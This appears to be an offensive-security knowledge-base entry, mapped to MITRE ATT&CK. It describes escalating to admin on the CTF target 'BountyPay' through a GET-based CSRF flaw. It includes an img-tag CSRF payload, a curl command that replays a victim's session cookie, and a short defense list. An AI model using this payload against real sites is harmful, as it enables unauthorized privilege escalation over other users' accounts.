---
id: proc-get-csrf-escalation
tags:
  - csrf
  - privilege-escalation
type: procedure
tools: []
tactics:
  - '[[Privilege Escalation]]'
commands:
  - '[[commands/html-csrf-poc]]'
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Forge Web Credentials]]'
updated_at: '2025-12-14T17:32:58.105Z'
skill_level: intermediate
impact_level: high
detection_risk: medium
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Privilege Escalation]]'
mitre_techniques:
  - '[[Forge Web Credentials]]'
---
# Privilege-Escalation-via-GET-CSRF

## Summary

Exploit a CSRF vulnerability in GET-based privilege escalation endpoints to elevate user roles on the BountyPay platform.

## Description

The endpoint lacks CSRF tokens and uses GET for sensitive actions, allowing forgery via img tags or links. In the CTF, this escalates to admin access.

## Requirements

1. Victim's session (same-site)
2. Knowledge of escalation URL
3. Ability to host malicious HTML

## Defense

Defensive measures and detection strategies:

- Use POST for sensitive actions
- Implement CSRF tokens
- SameSite cookies

## Objectives

1. Forge escalation request
2. Elevate privileges
3. Access admin functions

## Instructions

### Step 1: Craft CSRF Payload

**Context**: Create HTML to trigger GET.

**Command** ([[commands/html-csrf-poc]]):
```bash
# Save as poc.html: <img src="https://bountypay.h1ctf.com/escalate?role=admin" width="1" height="1">
```

> Host and deliver to victim.

### Step 2: Verify Escalation

**Context**: Check role update.

**Command** ([[commands/html-csrf-poc]]):
```bash
curl 'https://bountypay.h1ctf.com/profile' -b 'session=VICTIM_SESSION'
```

> Shows elevated role.

## MITRE ATT&CK Mapping

### Tactics

- [[Privilege Escalation]] Privilege Escalation

### Techniques

- [[Forge Web Credentials]] Forge Web Credentials

### Sub-Techniques

- None

## Commands Used

- [[commands/html-csrf-poc]]

## Tools Used

- None specific

## Tags

- [[csrf]]
- [[privilege-escalation]]
